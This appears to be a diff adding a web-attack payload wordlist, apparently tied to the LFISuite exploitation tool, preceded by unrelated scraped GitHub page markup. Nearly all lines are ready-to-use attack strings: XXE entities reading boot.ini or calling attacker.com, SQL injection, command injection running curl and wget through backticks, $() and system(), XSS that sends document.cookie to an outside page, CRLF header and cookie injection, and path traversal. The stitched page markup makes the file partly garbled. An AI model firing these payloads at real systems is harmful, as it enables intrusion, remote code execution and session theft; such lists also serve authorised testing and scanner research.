@@ -1,0 +1,539 @@
+<img src="https://qwerty/images/spinners/octocat-spinner-128.gif" alt="Octocat Spinner Icon" class="m-2" width="28">
+<img class="avatar mr-2" alt="" src="https://avatars3.githubusercontent.com/u/11485412?s=40&amp;v=4" width="20" height="20" />
+<img src="https://qwerty/images/search-shortcut-hint.svg" alt="" class="mr-2 header-search-key-slash">
+<a class="header-logo-invertocat my-0" href="https://qwerty/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark; experiment:site_header_dropdowns; group:control">
+<a rel="author" data-skip-pjax="true" data-hovercard-user-id="11485412" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/D35m0nd142"><img class="avatar" src="https://avatars3.githubusercontent.com/u/11485412?s=40&amp;v=4" width="20" height="20" alt="@D35m0nd142" /></a>
+<li class="mr-3"><a data-ga-click="Footer, go to contact, text:contact" href="https://qwerty/contact">Contact GitHub</a></li>
+<li class="mr-3"><a data-ga-click="Footer, go to privacy, text:privacy" href="https://qwerty/site/privacy">Privacy</a></li>
+<li class="mr-3"><a data-ga-click="Footer, go to terms, text:terms" href="https://qwerty/site/terms">Terms</a></li>
+<li class="mr-3"><a href="https://blog.qwerty" data-ga-click="Footer, go to blog, text:blog">Blog</a></li>
+<li class="mr-3"><a href="https://help.qwerty/articles/github-security/" data-ga-click="Footer, go to security, text:security">Security</a></li>
+<li class="mr-3"><a href="https://status.qwerty/" data-ga-click="Footer, go to status, text:status">Status</a></li>
+<li><a data-ga-click="Footer, go to about, text:about" href="https://qwerty/about">About</a></li>
+<li><a data-ga-click="Footer, go to help, text:help" href="https://help.qwerty">Help</a></li>
+<li class="mr-3"><a href="https://developer.qwerty" data-ga-click="Footer, go to api, text:api">API</a></li>
+<li class="mr-3"><a href="https://shop.qwerty" data-ga-click="Footer, go to shop, text:shop">Shop</a></li>
+<li class="mr-3"><a href="https://training.qwerty" data-ga-click="Footer, go to training, text:training">Training</a></li>
+<link href="https://qwerty/D35m0nd142/LFISuite/commits/master.atom" rel="alternate" title="Recent Commits to LFISuite:master" type="application/atom+xml">
+<meta name="expected-hostname" content="qwerty">
+<meta name="hostname" content="qwerty">
+<a aria-label="Homepage" title="GitHub" class="footer-octicon" href="https://qwerty">
+<link rel="canonical" href="https://qwerty/D35m0nd142/LFISuite/blob/master/pathtotest_huge.txt" data-pjax-transient>
+<meta property="og:image" content="https://avatars1.githubusercontent.com/u/11485412?s=400&amp;v=4" /><meta property="og:site_name" content="GitHub" /><meta property="og:type" content="object" /><meta property="og:title" content="D35m0nd142/LFISuite" /><meta property="og:url" content="https://qwerty/D35m0nd142/LFISuite" /><meta property="og:description" content="LFISuite - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner " />
+<script crossorigin="anonymous" async="async" integrity="sha512-wLZfgAdBq6KvcyT4bpPtuoRq5ufFmfp+eYpWa+U5fXnayvYBuV0+De3/OAWgAPBau7F+vGdNBys3QN5wL4mazA==" type="application/javascript" src="https://qwerty/assets/github-018308bfe7d9717a0bd9f3ea26cc733b.js"></script>
+<script crossorigin="anonymous" integrity="sha512-JlwyrGo00ua743AsbbW5Vd/RkPBJPiJpTRovst9Dpu7PaCWz7fSyCeglcfb98mxKcWj/vlKxawVyX+rgO+X1qQ==" type="application/javascript" src="https://qwerty/assets/frameworks-1fff0d56525ff1cf65a034415f915847.js"></script>
+<script crossorigin="anonymous" integrity="sha512-wIuAKDhvxe9wCaNR1tzCk3rtl+wXEWC28rmRpzmx0h98VEeWC6Y3xCWV1xAW6NP6eQQX+x8ZGhW6Sdut+mLRuw==" type="application/javascript" src="https://qwerty/assets/compat-a48960bafc17c30572990bbab3664e9c.js"></script>
+<link crossorigin="anonymous" media="all" integrity="sha512-V9a64JRnkUg/Cpl1MyEG/fDlLG4NnmKpmqGjlOH5drobCps28DLLkcHLCWkfd4uN5LfqD1dz2UMTd2Tx0gttYw==" rel="stylesheet" href="https://qwerty/assets/github-f01d758edeec501660dbed3e681f6493.css" />
+<link crossorigin="anonymous" media="all" integrity="sha512-YHvc7WRozgBgxyWsNXY72IZr4qNlk3TROCgCztYp+ZTcJ4AXUhw14lHDZFVhTWK8AIkaYqcwTbQPLH5OgtIdQw==" rel="stylesheet" href="https://qwerty/assets/site-55f1f061b00e9353264cb71e2adcc953.css" />
+<link crossorigin="anonymous" media="all" integrity="sha512-qQ+v+W1uJYfDMrQ/cwCVI+AGTsn1yi4rCU6KX45obe52BoF+WiHNeQ11u63iJA05vyivY57xNbhAsyK4/j1ZIQ==" rel="stylesheet" href="https://qwerty/assets/frameworks-01356238c65ce56a395237b592b58668.css" />
+<link rel="assets" href="https://qwerty/">
+<link rel="dns-prefetch" href="https://qwerty">
+<link rel="dns-prefetch" href="https://qwerty">
+<link rel="fluid-icon" href="https://qwerty/fluidicon.png" title="GitHub">
+<link rel="icon" type="image/x-icon" class="js-site-favicon" href="https://qwerty/favicon.ico">
+<link rel="mask-icon" href="https://qwerty/pinned-octocat.svg" color="#000000">
+<meta name="browser-errors-url" content="https://api.qwerty/_private/browser/errors">
+<meta name="browser-stats-url" content="https://api.qwerty/_private/browser/stats">
+<meta name="go-import" content="qwerty/D35m0nd142/LFISuite git https://qwerty/D35m0nd142/LFISuite.git">
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo>
+AS qwerty WHERE 1=1 AND 1=0
+ AS qwerty WHERE 1=1 AND 1=0#
+ AS qwerty WHERE 1=1 AND 1=0--
+ AS qwerty WHERE 1=1 AND 1=1
+ AS qwerty WHERE 1=1 AND 1=1#
+ AS qwerty WHERE 1=1 AND 1=1--
+ curl https://qwerty/.testing/rce_vuln.txt ||`curl https://qwerty/.testing/rce_vuln.txt` #' |curl https://qwerty/.testing/rce_vuln.txt||`curl https://qwerty/.testing/rce_vuln.txt` #\" |curl https://qwerty/.testing/rce_vuln.txt
+ onmouseover="document.cookie=true;">//qwerty
+")></qwerty>(qwerty)
+"/></qwerty>(qwerty)
+">/XaDoS/><script>alert(document.cookie)</script><script src="http://qwerty/XSS.js"></script>
+"></qwerty>(qwerty)
+"><h1><IFRAME width="420" height="315" SRC="http://qwerty/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+"><h1><iframe width="420" height="315" src="http://qwerty/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
+"><iframe%20src="http://qwerty"%%203E
+"><img src=x onerror=window.open('https://www.qwerty/');>
+"><img/src='x'onerror=alert(qwerty)>/%2E%2E/%2E%2E/
+"><img/src='x'onerror=alert(qwerty)>/%2E%2E/%2E%2E/
+$(`curl https://qwerty/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`wget https://qwerty/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`wget https://qwerty/.testing/rce_vuln.txt`)
+%0a%0a%0a%0a%0a%0a%%0a%0a%0a%0a%0a%0aqwerty%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a
+%0a%0a%0a%0a%0a%0a%%0a%0a%0a%0a%0a%0aqwerty%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a
+%0a%0aqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%0a%0a
+%0a%0dqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%0a%0d%0a%0d
+%0a%2ewww.qwerty%2f
+%0a%2eqwerty%2f
+%0a.www.qwerty/
+%0a.qwerty/
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fqwerty%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%20769%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.js%22)%3B%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.html%22)%3B%3E%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%20769%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.js%22)%3B%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.html%22)%3B%3E%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0aqwerty%0a
+%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%0a%0a
+%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%0a%0a
+%0aSet-Cookie: qwerty=qwerty
+%0aSet-Cookie: qwerty=qwerty%0aX:qwerty
+%0aSet-Cookie: qwerty=qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
+%0aSet-Cookie: qwerty=qwerty
+%0aSet-Cookie: qwerty=qwerty%0aX:qwerty
+%0aSet-Cookie: qwerty=qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
+%0aSet-Cookie:%20qwerty=qwerty;%0a
+%0aSet-Cookie:%20qwerty=qwerty;%0a
+%0d%0a%20Set-Cookie: qwerty=qwerty
+%0d%0a%20Set-Cookie: qwerty=qwerty
+%0d%0a%20Set-Cookie: x=x%0aX:qwerty
+%0d%0a%20Set-Cookie: x=x%0aX:qwerty
+%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0d%0aContent-Length%3A%20769%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.js%22)%3B%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fwww.qwerty%2F.testing%2Fxss.html%22)%3B%3E%0d%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0d%0aContent-Length%3A%20769%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.js%22)%3B%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fqwerty%2F.testing%2Fxss.html%22)%3B%3E%0d%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0d%0aqwerty%0d%0a
+%0d%0aReferer:%20https://qwerty/qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+%0d%0aReferer:%20https://qwerty/qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+%0d%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%0d%0a%0d%0a
+%0d%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%0d%0a%0d%0a
+%0d%0aSet-Cookie: qwerty=qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
+%0d%0aSet-Cookie: qwerty=x%0aX:qwerty
+%0d%0aSet-Cookie: qwerty=qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
+%0d%0aSet-Cookie: qwerty=x%0aX:qwerty
+%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0dqwerty%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d
+%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0dqwerty%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d%0d
+%0d%0dqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%0d%0d
+%0d%2ewww.qwerty%2f
+%0d%2eqwerty%2f
+%0d.www.qwerty%2f
+%0d.qwerty%2f
+%0dSet-Cookie: qwerty=qwerty
+%0dSet-Cookie: qwerty=qwerty%0aX:qwerty
+%0dSet-Cookie: qwerty=qwerty
+%0dSet-Cookie: qwerty=qwerty%0aX:qwerty
+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set-Cookie%3AqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set-Cookie%3AqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://qwert/xss.js%3E%3C/script%3E%22)’%3E
+%2F%2Fqwerty%0d%0aContent-Type%3Atext%2Fhtml%0d%0aContent-Length%0d%0a222%0d%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
+%2F%2qwerty%0aContent-Type%3Atext%2Fhtml%0aContent-Length%0a222%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
+%2Fx%2F%3cimg%2Fonerror='alert(qwerty)'src=x%3e%2f.%2e%2f.%2e%2f%3f
+%2Fx%2F%3cimg%2Fonerror='alert(qwerty)'src=x%3e%2f.%2e%2f.%2e%2f%3f
+%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(qwerty)%3c/script%3e%2F..%2F..%2F..%2F../
+%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(qwerty)%3c/script%3e%2F..%2F..%2F..%2F../
+%2e%2e/qwerty
+%2e%2e/qwerty/
+%2e%2e/qwerty
+%2e%2e/qwerty/
+%2e%5fwww.qwerty%2e%5f
+%2e%5fqwerty%2e%5f
+%2fwww.qwerty%2f%2e%2e
+%2fwww.qwerty%2f%2e%2e/tr
+%2fwww.qwerty/%2e%2e
+%2fwww.qwerty%2f%2e%2e
+%2fwww.qwerty%2f%2e%2e/tr
+%2fwww.qwerty/%2e%2e
+%E5%98%8A%E5%98%8DSet-Cookie: %20qwerty
+%E5%98%8A%E5%98%8DSet-Cookie: %20qwerty
+%E5%98%8A%E5%98%8DSet-Cookie: qwerty=qwerty
+%E5%98%8A%E5%98%8DSet-Cookie: qwerty=qwerty
+& curl http://qwerty/.testing/rce.txt
+& curl http://qwerty/rce.txt
+& curl http://xss.qwerty/.testing/rce.txt
+& system('curl https://qwerty/.testing/rce_vuln.txt');
+& wget http://qwerty/.testing/rce.txt
+& wget http://qwerty/rce.txt
+&& curl http://qwerty/rce.txt
+&& curl https://qwerty/.testing/rce_vuln.txt
+&& system('curl https://qwerty/.testing/rce_vuln.txt');
+&& wget http://qwerty/rce.txt
+&& wget https://qwerty/.testing/rce_vuln.txt
+&lt;A HREF=&quot;//www.qwerty/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://qwerty/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.gohttp://www.qwerty/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.qwerty./&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;javascript:document.location=&apos;http://www.qwerty/&apos;&quot;&gt;XSS&lt;/A&gt;
+&lt;IMG SRC=&quot;http://qwerty/somecommand.php?somevariables=maliciouscode&quot;&gt;
+'"></qwerty>(qwerty)
+')></qwerty>(qwerty)
+'+alert(qwerty)+'/%2E%2E
+'+alert(qwerty)+'/%2E%2E
+'>"><script src = 'http://qwerty/XSS.js'></script>
+'></qwerty>(qwerty)
+(qwerty)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++